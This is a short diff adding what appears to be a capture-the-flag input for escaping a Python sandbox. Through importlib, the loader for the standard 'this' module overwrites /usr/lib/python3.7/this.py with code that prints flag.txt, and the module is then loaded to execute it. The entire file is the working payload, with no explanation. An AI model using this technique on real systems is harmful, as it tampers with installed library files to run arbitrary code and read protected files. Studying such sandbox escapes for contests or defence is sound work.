@@ -1,0 +1,9 @@
+3
+importlib
+importlib.util
+this
+loader = importlib.util.find_spec("this").loader
+loader.set_data("/usr/lib/python3.7/this.py", b"""print(open("flag.txt").read())""")
+loader.load_module()
+
+.
